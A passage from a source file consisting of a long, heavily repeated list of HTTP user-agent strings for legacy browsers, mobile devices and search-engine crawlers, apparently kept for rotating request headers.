               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
